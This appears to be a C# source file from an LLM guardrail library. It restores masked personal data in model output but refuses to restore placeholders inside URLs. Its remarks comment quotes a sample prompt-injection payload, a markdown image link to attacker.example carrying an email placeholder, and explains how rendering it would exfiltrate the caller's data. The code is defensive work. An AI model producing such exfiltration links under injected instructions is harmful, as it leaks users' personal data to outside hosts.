namespace Sentinel.Guardrails.Pii;

/// <summary>
/// Puts original values back into model output. Only exact placeholder tokens the vault issued are replaced;
/// anything else that looks like one (a hallucinated "[EMAIL_7]") is left untouched.
/// </summary>
/// <remarks>
/// A placeholder inside a URL is never restored: an injected instruction can make the model write
/// <c>![x](https://attacker.example/?q=[EMAIL_1])</c>, and restoring it would hand the caller's own data to
/// whoever serves that image the moment the client renders the answer.
/// </remarks>
public static class PiiRestorer
{
    /// <summary>How far back the URL check looks for the start of the token holding a placeholder.</summary>
    internal const int UrlLookBehind = 256;

    /// <param name="text">Model output containing placeholders.</param>
    /// <param name="vault">The request's vault.</param>
    /// <param name="includeContextValues">
    /// Also reveal values found in retrieved documents or tool output. Off for answers to callers: a document the
    /// caller may read can still mention someone else's phone number, and the model must not become the channel
    /// that un-masks it.
    /// </param>
    public static string Restore(string text, PiiVault vault, bool includeContextValues) =>
        Restore(text, vault, includeContextValues, leadingContext: string.Empty);

    /// <param name="leadingContext">Text that precedes <paramref name="text"/> (streaming), for the URL check.</param>
    internal static string Restore(string text, PiiVault vault, bool includeContextValues, string leadingContext)
    {
        ArgumentNullException.ThrowIfNull(text);
        ArgumentNullException.ThrowIfNull(vault);

        if (vault.IsEmpty || !text.Contains('[', StringComparison.Ordinal))
        {
            return text;
        }

        return Placeholders.Token().Replace(text, match =>
            !IsInsideUrl(leadingContext, text, match.Index) && vault.TryReveal(match.Value, includeContextValues, out var value)
                ? value
                : match.Value);
    }

    /// <summary>Whether the whitespace-free token that contains position <paramref name="index"/> is a URL.</summary>
    private static bool IsInsideUrl(string leading, string text, int index)
    {
        Span<char> buffer = stackalloc char[UrlLookBehind];
        var length = 0;
        for (var i = index - 1; i >= -leading.Length && length < UrlLookBehind; i--)
        {
            var c = i >= 0 ? text[i] : leading[leading.Length + i];
            if (char.IsWhiteSpace(c))
            {
                break;
            }

            buffer[UrlLookBehind - 1 - length++] = c;
        }

        var token = buffer[(UrlLookBehind - length)..];
        return token.Contains("://", StringComparison.Ordinal)
            || token.StartsWith("www.", StringComparison.OrdinalIgnoreCase)
            || token.Contains("](", StringComparison.Ordinal);
    }
}
